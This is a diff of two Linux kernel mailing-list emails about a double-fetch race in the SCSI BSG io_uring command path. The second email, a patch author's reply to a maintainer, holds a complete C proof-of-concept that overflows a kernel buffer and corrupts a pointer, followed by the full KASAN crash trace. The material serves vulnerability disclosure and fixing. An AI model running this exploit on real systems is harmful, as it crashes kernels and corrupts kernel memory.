@@ -1,177 +1,402 @@
-Return-Path: <io-uring+bounces-13529-lists+io-uring=lfdr.de@vger.kernel.org>
+Return-Path: <io-uring+bounces-13530-lists+io-uring=lfdr.de@vger.kernel.org>
 Delivered-To: lists+io-uring@lfdr.de
 Received: from mail.lfdr.de
 	by lfdr with LMTP
-	id QAQBC5sYF2pR4QcAu9opvQ
-	(envelope-from <io-uring+bounces-13529-lists+io-uring=lfdr.de@vger.kernel.org>)
-	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:15:23 +0200
+	id cFO0CpwZF2ov4gcAu9opvQ
+	(envelope-from <io-uring+bounces-13530-lists+io-uring=lfdr.de@vger.kernel.org>)
+	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:19:40 +0200
 X-Original-To: lists+io-uring@lfdr.de
-Received: from sin.lore.kernel.org (sin.lore.kernel.org [104.64.211.4])
-	by mail.lfdr.de (Postfix) with ESMTPS id 2DB335E793B
-	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:15:22 +0200 (CEST)
+Received: from tor.lore.kernel.org (tor.lore.kernel.org [IPv6:2600:3c04:e001:36c::12fc:5321])
+	by mail.lfdr.de (Postfix) with ESMTPS id 958B15E7A29
+	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:19:38 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
-	by sin.lore.kernel.org (Postfix) with ESMTP id 03D7F3039C31
-	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 16:06:52 +0000 (UTC)
+	by tor.lore.kernel.org (Postfix) with ESMTP id B7C3B30193A6
+	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 16:19:37 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 91F823128A3;
-	Wed, 27 May 2026 16:06:51 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id BD52E40B6E7;
+	Wed, 27 May 2026 16:19:36 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=kernel-dk.20251104.gappssmtp.com header.i=@kernel-dk.20251104.gappssmtp.com header.b="O1aMiL1o"
+	dkim=fail reason="key not found in DNS" (0-bit key) header.d=rexion.ai header.i=@rexion.ai header.b="oZZm7b0p"
 X-Original-To: io-uring@vger.kernel.org
-Received: from mail-ot1-f47.google.com (mail-ot1-f47.google.com [209.85.210.47])
+Received: from out-13.smtp.spacemail.com (out-13.smtp.spacemail.com [63.250.43.96])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3DE4F421A08
-	for <io-uring@vger.kernel.org>; Wed, 27 May 2026 16:06:49 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.47
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 250BA382377;
+	Wed, 27 May 2026 16:19:35 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=63.250.43.96
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1779898011; cv=none; b=lVmKIOVUzp/ukBnqKFvw8f6aWm23CWtTJ4edzAR+T0/g+AbNqWUpXTteIrhHnBCJ5CFqJJ6BGrpUf0HIxN38Lmcwv6vuFPBSRiY+LcfuIqwHRx8huDehGwKaU7yAH/0eJBI1hiNtgITacyL9N7qAJLekUXr326/52TX9GX1t6pI=
+	t=1779898776; cv=none; b=n0abF36EtRvWHhs+Wxt+2rUt3i8x0tIlshBPWshVU36Zk6rTRGQwz2DLRGFef2UeoiqjX5VIAlUOJ+RMBO2rBLzGBpBZWqDUP4faoB4CCZ2xzV1N4lR6wK0OTOX0/kMBtEgRQCfdk4elaLsmcihSLVdXKLJgqH/p6AsJgSou3oo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1779898011; c=relaxed/simple;
-	bh=fwkxSqx7ty2JQSbgYGjXCJheNp4aXVJfNCMAJtiBUtE=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=XnoWxVLdMLicCBhbiCyyJQ+hJ0Ie3EmBDwD7cFmhB6D4Q2xOLzouvxRgOlyOFIz5eSLGWTettd/26wOU5Z5SKy9NsmL5FmSvAeuVtn2VIbzQk/CqhbOa18Z8GDxFhGjn9C8jv0syLTAKhv1erujTz8spaAXVvsG94OutI2r8/hw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=kernel.dk; spf=pass smtp.mailfrom=kernel.dk; dkim=pass (2048-bit key) header.d=kernel-dk.20251104.gappssmtp.com header.i=@kernel-dk.20251104.gappssmtp.com header.b=O1aMiL1o; arc=none smtp.client-ip=209.85.210.47
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=kernel.dk
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=kernel.dk
-Received: by mail-ot1-f47.google.com with SMTP id 46e09a7af769-7e603d0ee0aso3333946a34.2
-        for <io-uring@vger.kernel.org>; Wed, 27 May 2026 09:06:48 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=kernel-dk.20251104.gappssmtp.com; s=20251104; t=1779898008; x=1780502808; darn=vger.kernel.org;
-        h=content-transfer-encoding:in-reply-to:from:content-language
-         :references:cc:to:subject:user-agent:mime-version:date:message-id
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=DDewevQlsNX9Nf5an4WdPkqFyUO5oYIAKU8piRx5pII=;
-        b=O1aMiL1oIFen2XoIfw6SCJALa8Ot1OyXMqMDB/oU7qEd7xqcpJcmD2Obpa7Xhf18Wb
-         Tv/hwDlI7f60fJZz3LA5WSK4ha8sHBqy0Kfvy69FTonSDHkqHImBe3jY7r5kUGVV69g6
-         DhgWZzngjuvHdU+DNARaOlOBOOyKC+yJ6iCMDZXnpaxkUD82iSBKl0+T6BjDJfWzZiQg
-         6B27azfpAuiutURWisO1EMMtvonRee30OHl5YFyTxvXi+wBdj4rE79r/FP+yG15cxFY8
-         kseLG06/4whit0X1Jj2asavVTSHHe2CqrCILfrcIu8BMz8zsF0kxznceQwGoyP4Yuqbv
-         9JUA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1779898008; x=1780502808;
-        h=content-transfer-encoding:in-reply-to:from:content-language
-         :references:cc:to:subject:user-agent:mime-version:date:message-id
-         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
-         :reply-to;
-        bh=DDewevQlsNX9Nf5an4WdPkqFyUO5oYIAKU8piRx5pII=;
-        b=CrkezwrWap5WonYApSlQSm0W5vilcU1kU2Me+1GiZPKZMv6kpEVEOJQ0qCY6w8i/5e
-         HWELOpPaaK9XYLFzqJ9/Zn5y1kAjhUcJPQ0vRGgNPFBGt5hcEZQXlkZ0BaxGYsjXrrIR
-         fp+Do297f+OrJ7Ugu+e6cmpgIBojaghAPZ0lWxLVy7bB6XfHQMdyHDQzHKmLnf6O7UVW
-         AIB5vH7QzqhNPMo2o6vNDI2yX40cmw8aHsB1evsUrjob0QjPE7HzGoxA2zJiw2LxRr0w
-         8dLydiBSzaJBboLCBMbyNJLWG9AceD5dIq76sBaY3AmZwODMg2uJUsjuCgXflWGIptqC
-         H1tw==
-X-Forwarded-Encrypted: i=1; AFNElJ8iJxm7K0HDBqJ6HAS0aC5ttu7SsfV5RusS+81fDiE0XPsdCk+vn4tIzU0UWVQS/0al9mKAdv37Bw==@vger.kernel.org
-X-Gm-Message-State: AOJu0YwJifKdHr0evaDuiWieZAf4JuQ9b1BSMNo6ans2bsU1GTO2qtTZ
-	VPvc+E0NE6FR/F3zF4ZMXrYm2s8ujhmFkq6stAMIq9VWdqYpwcHg4GTdmMNE3vVPuU7N2loZGkj
-	2hWIVr5w=
-X-Gm-Gg: Acq92OGtWn7IErV2TP+g1D7zCH4jZ4SIdewq+ZQ7VhFCHZmw8AaRH05PSrOt/F6f63p
-	4XLnxuGi5G1Ikbul+vohKl+n1sYH2rDCTUb84BL35rc6MvUuxyw0gbGIS/OYwEGADrNEtb7vowA
-	Hp2Fcp6JmY5GbBgi3J86RurqvfVZ34zeUj7YEK3B80zuFGXOPl2mEX4xFWv7rjyEs7PwzoRkMSb
-	Kc9Rxksm+WttMEvuc/5Zpf3QZmI+E2RDT2fU0NvWe0/D2kGbCd/kp9Qm890/Fd9oYqonpBiHLs1
-	KoX6SzmNfgaS5EHOSz3DAAsr99kTRJbNgYrieTgC+cDye+e49adzmkVw3hCLgVj8XCaMkml8Upt
-	ynxWWNBSJrGqs7FHbcdMbXow3ekhHbLdr0x8uYdG8tMXfc1Q36H6Vl8T1T/HZAOy6diw3kUVvgR
-	7QKIfwz+oLagXvvex9Wea0IUwG2eLxTN98nSlkmolnnZeYx1rFQJb4CiC/K+yjh2YT+6iZIozNa
-	61G7YrMwm9s+4TIcCM=
-X-Received: by 2002:a05:6830:6682:b0:7dc:dd58:50a1 with SMTP id 46e09a7af769-7e5fee5ef73mr15600883a34.15.1779898007969;
-        Wed, 27 May 2026 09:06:47 -0700 (PDT)
-Received: from [192.168.1.102] ([96.43.243.2])
-        by smtp.gmail.com with ESMTPSA id 46e09a7af769-7e606459bf7sm11606383a34.1.2026.05.27.09.06.45
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Wed, 27 May 2026 09:06:45 -0700 (PDT)
-Message-ID: <ee931505-64a2-411d-8607-3db8912b70c4@kernel.dk>
-Date: Wed, 27 May 2026 10:06:44 -0600
+	s=arc-20240116; t=1779898776; c=relaxed/simple;
+	bh=S1tJkdyoDp2Ullzl0sv1HzmEu95/VREu6vd4iF/X7b8=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version:Content-Type; b=Jg2dKblv8BQ5Epmy3rkpR6QKTII+bPhD5YA5+UFpGvEsnIF06t9cWJ+UZ/vuM7cuU+Qr2oOAuxnkDRyHtCJqc3VVUOCd2y0YI5cejX3izprMoqGen8p4zNywCobnR3xKlnJ0wqAOMwXTbJYfnyK4jPIXXKrvkVywRxwr2sQX+TQ=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=rexion.ai; spf=pass smtp.mailfrom=rexion.ai; dkim=fail (0-bit key) header.d=rexion.ai header.i=@rexion.ai header.b=oZZm7b0p reason="key not found in DNS"; arc=none smtp.client-ip=63.250.43.96
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=rexion.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=rexion.ai
+Received: from Kyren (unknown [49.207.213.66])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
+	(No client certificate requested)
+	by mail.spacemail.com (Postfix) with ESMTPSA id 4gQZZV0Hwfz2x98;
+	Wed, 27 May 2026 16:19:29 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=rexion.ai;
+	s=spacemail; t=1779898773;
+	bh=q3aOJxX3UcpX51hBcAUWWpzViJsvtODvHGcSvzK7tmY=;
+	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
+	b=oZZm7b0pH4IgTUqhTMHn3kekARwDV8DDYO1kqIQ3zvYdGJZHG80eH/Th36Ld1LAMo
+	 Kp46lI3qrKAp6lP9W/tI7zVxj4QVpn5SRhFJm8eAEjSXwAomsM1h6W8yMFHqzRNUvr
+	 7WgeSZ1W82dYJnTCg180lG1U147nkPXiuL79XdsuBRr+NxHQ+wZPcS5MLDqMRDJKeH
+	 /4nph4C+RdRDptjSyql3I0Ys/vLECxBURTFn8sCscRuvl5+tOw8l7UnV+wOd0Yuzp0
+	 RRiBBkXevd6LaW8qCI61b40w2z7F79kdZZa9pKWLqovnYQTiewA9VdjBMrzOhf8thH
+	 J6Wzbtz5ULumQ==
+From: Rahul Chandelkar <rc@rexion.ai>
+To: axboe@kernel.dk
+Cc: James.Bottomley@HansenPartnership.com,
+	martin.petersen@oracle.com,
+	fujita.tomonori@lab.ntt.co.jp,
+	linux-scsi@vger.kernel.org,
+	linux-block@vger.kernel.org,
+	io-uring@vger.kernel.org
+Subject: Re: [PATCH] scsi: bsg: copy uring_cmd payload to prevent double-fetch from shared SQE
+Date: Wed, 27 May 2026 21:49:26 +0530
+Message-ID: <20260527161926.4071110-1-rc@rexion.ai>
+X-Mailer: git-send-email 2.54.0
+In-Reply-To: <ee931505-64a2-411d-8607-3db8912b70c4@kernel.dk>
+References: <20260527105931.3950913-1-rc@rexion.ai> <ee931505-64a2-411d-8607-3db8912b70c4@kernel.dk>
 Precedence: bulk
 X-Mailing-List: io-uring@vger.kernel.org
 List-Id: <io-uring.vger.kernel.org>
 List-Subscribe: <mailto:io-uring+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:io-uring+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH] scsi: bsg: copy uring_cmd payload to prevent double-fetch
- from shared SQE
-To: Rahul Chandelkar <rc@rexion.ai>,
- "James E . J . Bottomley" <James.Bottomley@HansenPartnership.com>,
- "Martin K . Petersen" <martin.petersen@oracle.com>,
- FUJITA Tomonori <fujita.tomonori@lab.ntt.co.jp>
-Cc: linux-scsi@vger.kernel.org, linux-block@vger.kernel.org,
- io-uring@vger.kernel.org, linux-kernel@vger.kernel.org,
- stable@vger.kernel.org
-References: <20260527105931.3950913-1-rc@rexion.ai>
-Content-Language: en-US
-From: Jens Axboe <axboe@kernel.dk>
-In-Reply-To: <20260527105931.3950913-1-rc@rexion.ai>
 Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-X-Spamd-Result: default: False [-1.66 / 15.00];
+Content-Transfer-Encoding: 8bit
+X-Envelope-From: rc@rexion.ai
+X-Spamd-Result: default: False [-0.46 / 15.00];
 	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
-	R_SPF_ALLOW(-0.20)[+ip4:104.64.211.4:c];
-	R_DKIM_ALLOW(-0.20)[kernel-dk.20251104.gappssmtp.com:s=20251104];
+	MID_CONTAINS_FROM(1.00)[];
+	R_SPF_ALLOW(-0.20)[+ip6:2600:3c04:e001:36c::/64:c];
 	MAILLIST(-0.15)[generic];
 	MIME_GOOD(-0.10)[text/plain];
 	HAS_LIST_UNSUB(-0.01)[];
-	FORGED_RECIPIENTS_MAILLIST(0.00)[];
-	DKIM_TRACE(0.00)[kernel-dk.20251104.gappssmtp.com:+];
-	TAGGED_FROM(0.00)[bounces-13529-lists,io-uring=lfdr.de];
-	FROM_HAS_DN(0.00)[];
-	DMARC_NA(0.00)[kernel.dk];
-	RCVD_TLS_LAST(0.00)[];
+	R_DKIM_PERMFAIL(0.00)[rexion.ai:s=spacemail];
 	MIME_TRACE(0.00)[0:+];
+	TAGGED_FROM(0.00)[bounces-13530-lists,io-uring=lfdr.de];
+	RCVD_TLS_LAST(0.00)[];
+	DMARC_NA(0.00)[rexion.ai];
+	RCVD_COUNT_THREE(0.00)[4];
+	DKIM_TRACE(0.00)[rexion.ai:~];
+	FORGED_RECIPIENTS_MAILLIST(0.00)[];
+	FROM_HAS_DN(0.00)[];
 	FORGED_SENDER_MAILLIST(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:104.64.192.0/19, country:SG];
-	RCVD_VIA_SMTP_AUTH(0.00)[];
-	TAGGED_RCPT(0.00)[io-uring];
+	TO_DN_NONE(0.00)[];
 	PRECEDENCE_BULK(0.00)[];
-	FROM_NEQ_ENVFROM(0.00)[axboe@kernel.dk,io-uring@vger.kernel.org];
-	TO_DN_SOME(0.00)[];
-	RCVD_COUNT_FIVE(0.00)[5];
-	MID_RHS_MATCH_FROM(0.00)[];
-	NEURAL_HAM(-0.00)[-1.000];
-	RCPT_COUNT_SEVEN(0.00)[9];
-	DBL_BLOCKED_OPENRESOLVER(0.00)[sin.lore.kernel.org:rdns,sin.lore.kernel.org:helo,kernel-dk.20251104.gappssmtp.com:dkim,kernel.dk:mid]
-X-Rspamd-Queue-Id: 2DB335E793B
+	FROM_NEQ_ENVFROM(0.00)[rc@rexion.ai,io-uring@vger.kernel.org];
+	ASN(0.00)[asn:63949, ipnet:2600:3c04::/32, country:SG];
+	NEURAL_HAM(-0.00)[-0.987];
+	TAGGED_RCPT(0.00)[io-uring];
+	RCPT_COUNT_SEVEN(0.00)[7];
+	RCVD_VIA_SMTP_AUTH(0.00)[];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[rctx.target:url,tor.lore.kernel.org:rdns,tor.lore.kernel.org:helo]
+X-Rspamd-Queue-Id: 958B15E7A29
 X-Rspamd-Action: no action
 X-Rspamd-Server: lfdr
 
-On 5/27/26 4:59 AM, Rahul Chandelkar wrote:
-> scsi_bsg_uring_cmd() and scsi_bsg_map_user_buffer() read bsg_uring_cmd
-> fields directly from the shared mmap'd io_uring submission ring via
-> io_uring_sqe128_cmd().  On the inline execution path, io_uring has not
-> yet copied the SQE to kernel memory, so a concurrent userspace thread
-> can modify fields between reads.
-> 
-> cmd->request_len is read for the bounds check, for the cmd_len
-> assignment, and for the copy_from_user length.  A racing thread can
-> change request_len between the bounds check (passes with <= 32) and
-> copy_from_user (uses the enlarged value), overflowing the 32-byte
-> scmd->cmnd[] buffer into subsequent struct scsi_cmnd fields.
-> 
-> scsi_bsg_map_user_buffer() independently re-derives its cmd pointer
-> from the same shared SQE, re-reading dout_xfer_len, din_xfer_len,
-> dout_xferp, and din_xferp, enabling direction confusion and buffer
-> length races.
-> 
-> Copy struct bsg_uring_cmd to a stack-local variable before use in both
-> functions.  The pointer variable 'cmd' is redirected to the local copy
-> so the rest of each function is unchanged.
-> 
-> Tested with KASAN on QEMU (virtio-scsi, 2 vCPUs).  Without this fix,
-> a two-thread race produces:
-> 
->   BUG: KASAN: wild-memory-access in scsi_queue_rq+0x4a3/0x58a0
->   Write of size 96 at addr dead000000001000 by task poc/67
->   Call Trace:
->    kasan_report+0xce/0x100
->    __asan_memset+0x23/0x50
->    scsi_queue_rq+0x4a3/0x58a0
->    scsi_bsg_uring_cmd+0x942/0x1570
->    io_uring_cmd+0x2f6/0x950
->    io_issue_sqe+0xe5/0x22d0
+On Wed, May 27, 2026 at 10:06:44AM -0600, Jens Axboe wrote:
+> I don't think this is the right way to fix it, ->sqe should've been
+> stable upfront if this ends up happening. Can you share your poc with
+> me? Your trace has been trimmed down way too much to be useful.
 
-I don't think this is the right way to fix it, ->sqe should've been
-stable upfront if this ends up happening. Can you share your poc with
-me? Your trace has been trimmed down way too much to be useful.
+Agreed that a core-level copy before the inline callback would be the
+right fix and would eliminate the entire class for every uring_cmd
+driver. The per-driver copy was meant as a minimal backportable fix
+for the immediate scsi_bsg path.
 
--- 
-Jens Axboe
+PoC and full trace below.
+
+--- PoC (poc_bsg_toctou.c) ---
+
+Build:  gcc -O2 -pthread -static -o poc poc_bsg_toctou.c
+Usage:  ./poc /dev/bsg/X
+Needs:  2+ CPUs, io_uring, /dev/bsg/* access
+
+The racer thread flips request_len between 16 (passes the <=32 bounds
+check) and 128 (used by copy_from_user, overflows scmd->cmnd[32]).
+The overflow payload plants 0xdead000000001000 at the sense_buffer
+pointer offset (+84 from cmnd[0]). When scsi_queue_rq() does
+memset(scmd->sense_buffer, 0, SCSI_SENSE_BUFFERSIZE) it faults on the
+corrupted pointer.
+
+Tested on v7.1-rc1, KASAN, QEMU virtio-scsi, 2 vCPUs.
+
+/*
+ * PoC: SCSI BSG uring_cmd TOCTOU heap buffer overflow
+ *
+ * Overflows scmd->cmnd[32] to corrupt sense_buffer pointer.
+ * On successful race, memset(corrupted_sense_buffer, 0, 96) in
+ * scsi_queue_rq() causes a kernel fault proving the vulnerability.
+ *
+ * Usage: ./poc /dev/bsg/X
+ * Build: gcc -O2 -pthread -static -o poc poc_bsg_toctou.c
+ */
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <sched.h>
+#include <stdatomic.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <linux/io_uring.h>
+
+struct bsg_uring_cmd {
+	uint64_t request;
+	uint32_t request_len;
+	uint32_t protocol;
+	uint32_t subprotocol;
+	uint32_t max_response_len;
+	uint64_t response;
+	uint64_t dout_xferp;
+	uint32_t dout_xfer_len;
+	uint32_t dout_iovec_count;
+	uint64_t din_xferp;
+	uint32_t din_xfer_len;
+	uint32_t din_iovec_count;
+	uint32_t timeout_ms;
+	uint8_t  reserved[12];
+};
+
+#define QUEUE_DEPTH   4
+#define OVERFLOW_LEN  128
+#define SAFE_LEN      16
+
+static atomic_int stop_flag = 0;
+
+static int sys_io_uring_setup(unsigned entries, struct io_uring_params *p)
+{
+	return syscall(__NR_io_uring_setup, entries, p);
+}
+
+static int sys_io_uring_enter(int fd, unsigned to_submit,
+			      unsigned min_complete, unsigned flags)
+{
+	return syscall(__NR_io_uring_enter, fd, to_submit, min_complete,
+		       flags, NULL, 0);
+}
+
+struct race_ctx {
+	volatile uint32_t *target;
+	int cpu;
+};
+
+static void *racer_thread(void *arg)
+{
+	struct race_ctx *ctx = arg;
+	cpu_set_t cpuset;
+
+	CPU_ZERO(&cpuset);
+	CPU_SET(ctx->cpu, &cpuset);
+	sched_setaffinity(0, sizeof(cpuset), &cpuset);
+
+	while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
+		*ctx->target = OVERFLOW_LEN;
+		*ctx->target = OVERFLOW_LEN;
+		*ctx->target = OVERFLOW_LEN;
+		*ctx->target = OVERFLOW_LEN;
+	}
+	return NULL;
+}
+
+int main(int argc, char **argv)
+{
+	struct io_uring_params params;
+	int ring_fd, bsg_fd;
+	void *sq_ring, *cq_ring, *sqe_ring;
+	unsigned *sq_head, *sq_tail, *sq_mask, *sq_array;
+	unsigned *cq_head, *cq_tail, *cq_mask;
+	size_t sqe_stride;
+	pthread_t racer;
+	struct race_ctx rctx;
+	int i, attempts = 0;
+	int max_attempts = 500000;
+
+	if (argc < 2) {
+		fprintf(stderr, "Usage: %s /dev/bsg/X\n", argv[0]);
+		return 1;
+	}
+
+	bsg_fd = open(argv[1], O_RDWR);
+	if (bsg_fd < 0) {
+		perror("open bsg");
+		return 1;
+	}
+
+	cpu_set_t cpuset;
+	CPU_ZERO(&cpuset);
+	CPU_SET(0, &cpuset);
+	sched_setaffinity(0, sizeof(cpuset), &cpuset);
+
+	memset(&params, 0, sizeof(params));
+	params.flags = IORING_SETUP_SQE128 | IORING_SETUP_CQE32;
+
+	ring_fd = sys_io_uring_setup(QUEUE_DEPTH, &params);
+	if (ring_fd < 0) {
+		perror("io_uring_setup");
+		return 1;
+	}
+
+	size_t sq_ring_sz = params.sq_off.array +
+			    params.sq_entries * sizeof(unsigned);
+	sq_ring = mmap(NULL, sq_ring_sz, PROT_READ | PROT_WRITE,
+		       MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_SQ_RING);
+
+	sq_head  = sq_ring + params.sq_off.head;
+	sq_tail  = sq_ring + params.sq_off.tail;
+	sq_mask  = sq_ring + params.sq_off.ring_mask;
+	sq_array = sq_ring + params.sq_off.array;
+
+	sqe_stride = 2 * sizeof(struct io_uring_sqe);
+	sqe_ring = mmap(NULL, params.sq_entries * sqe_stride,
+			PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
+			ring_fd, IORING_OFF_SQES);
+
+	size_t cqe_size = sizeof(struct io_uring_cqe) + 16;
+	size_t cq_ring_sz = params.cq_off.cqes +
+			    params.cq_entries * cqe_size;
+	cq_ring = mmap(NULL, cq_ring_sz, PROT_READ | PROT_WRITE,
+		       MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_CQ_RING);
+
+	cq_head = cq_ring + params.cq_off.head;
+	cq_tail = cq_ring + params.cq_off.tail;
+	cq_mask = cq_ring + params.cq_off.ring_mask;
+
+	unsigned char payload[OVERFLOW_LEN];
+	memset(payload, 0x41, sizeof(payload));
+	payload[0] = 0x12; /* INQUIRY opcode */
+
+	uint64_t bad_sense = 0xdead000000001000ULL;
+	memcpy(payload + 84, &bad_sense, 8);
+
+	printf("[*] SCSI BSG uring_cmd TOCTOU PoC\n");
+	printf("[*] Target: %s\n", argv[1]);
+	printf("[*] Overflow: %d -> %d bytes (sense_buffer at +84)\n",
+	       SAFE_LEN, OVERFLOW_LEN);
+	printf("[*] Bad sense_buffer: 0x%lx\n", (unsigned long)bad_sense);
+
+	rctx.cpu = 1;
+
+	while (attempts < max_attempts) {
+		unsigned tail = *sq_tail;
+		unsigned idx = tail & *sq_mask;
+
+		struct io_uring_sqe *sqe =
+			(struct io_uring_sqe *)((char *)sqe_ring +
+						idx * sqe_stride);
+		memset(sqe, 0, sqe_stride);
+
+		sqe->opcode = IORING_OP_URING_CMD;
+		sqe->fd = bsg_fd;
+
+		struct bsg_uring_cmd *cmd =
+			(struct bsg_uring_cmd *)((char *)sqe + 48);
+
+		cmd->request     = (uint64_t)(unsigned long)payload;
+		cmd->request_len = SAFE_LEN;
+		cmd->protocol    = 0;
+		cmd->subprotocol = 0;
+		cmd->max_response_len = 96;
+		cmd->timeout_ms  = 1000;
+
+		rctx.target = &cmd->request_len;
+
+		if (attempts == 0) {
+			pthread_create(&racer, NULL, racer_thread, &rctx);
+			usleep(1000);
+		}
+
+		sq_array[idx] = idx;
+
+		cmd->request_len = SAFE_LEN;
+		__atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
+
+		sys_io_uring_enter(ring_fd, 1, 1, IORING_ENTER_GETEVENTS);
+
+		while (*cq_head != *cq_tail)
+			__atomic_store_n(cq_head, *cq_head + 1,
+					 __ATOMIC_RELEASE);
+
+		attempts++;
+		if (attempts % 50000 == 0)
+			printf("[*] %d attempts...\n", attempts);
+	}
+
+	atomic_store(&stop_flag, 1);
+	pthread_join(racer, NULL);
+
+	printf("[!] %d attempts done. Check dmesg for crash.\n", attempts);
+
+	close(bsg_fd);
+	close(ring_fd);
+	return 0;
+}
+
+--- Full KASAN trace (untruncated) ---
+
+[    4.784469] ==================================================================
+[    4.784815] BUG: KASAN: wild-memory-access in scsi_queue_rq+0x4a3/0x58a0
+[    4.785140] Write of size 96 at addr dead000000001000 by task poc/67
+[    4.785443] 
+[    4.785529] CPU: 0 UID: 0 PID: 67 Comm: poc Not tainted 7.1.0-rc1 #2 PREEMPT(lazy) 
+[    4.785532] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[    4.785534] Call Trace:
+[    4.785536]  <TASK>
+[    4.785537]  dump_stack_lvl+0x53/0x70
+[    4.785540]  kasan_report+0xce/0x100
+[    4.785543]  ? scsi_queue_rq+0x4a3/0x58a0
+[    4.785546]  kasan_check_range+0x105/0x1b0
+[    4.785549]  __asan_memset+0x23/0x50
+[    4.785550]  scsi_queue_rq+0x4a3/0x58a0
+[    4.785553]  ? __pfx_scsi_queue_rq+0x10/0x10
+[    4.785556]  ? scsi_mq_get_budget+0xa8/0x670
+[    4.785558]  blk_mq_dispatch_rq_list+0x462/0x42b0
+[    4.785561]  ? blk_mq_rq_ctx_init+0x57a/0xcc0
+[    4.785564]  ? __pfx_blk_mq_dispatch_rq_list+0x10/0x10
+[    4.785566]  ? __pfx__raw_spin_lock+0x10/0x10
+[    4.785569]  __blk_mq_sched_dispatch_requests+0x2e2/0x23a0
+[    4.785574]  ? __pfx___blk_mq_sched_dispatch_requests+0x10/0x10
+[    4.785580]  ? blk_mq_insert_request+0x402/0x13f0
+[    4.785582]  blk_mq_sched_dispatch_requests+0xec/0x270
+[    4.785584]  blk_mq_run_hw_queue+0x797/0x10e0
+[    4.785586]  scsi_bsg_uring_cmd+0x942/0x1570
+[    4.785588]  ? __pfx_scsi_bsg_uring_cmd+0x10/0x10
+[    4.785594]  io_uring_cmd+0x2f6/0x950
+[    4.785599]  __io_issue_sqe+0xb6/0xcc0
+[    4.785601]  io_issue_sqe+0xe5/0x22d0
+[    4.785606]  ? io_uring_cmd_prep+0x619/0xa10
+[    4.785609]  io_submit_sqes+0xb4a/0x4540
+[    4.785614]  __do_sys_io_uring_enter+0x148c/0x2f50
+[    4.785618]  do_syscall_64+0xf9/0x540
+[    4.785621]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+
+Second fault (completion path reading corrupted sense_buffer):
+
+[    4.799563] KASAN: maybe wild-memory-access in range [0xdead000000001000-0xdead000000001007]
+[    4.800411] RIP: 0010:scsi_normalize_sense+0x47/0x480
+[    4.803461] R12: dead000000001000
+[    4.841254] Kernel panic - not syncing: Fatal exception in interrupt
+
+R12 holds the corrupted sense_buffer pointer (0xdead000000001000),
+confirming the overflow overwrote sense_buffer at the expected offset.
+
+The io_submit_sqes -> io_issue_sqe -> io_uring_cmd -> scsi_bsg_uring_cmd
+path shows this is the inline execution path where the SQE has not been
+copied to kernel memory yet.
+
+Rahul
 
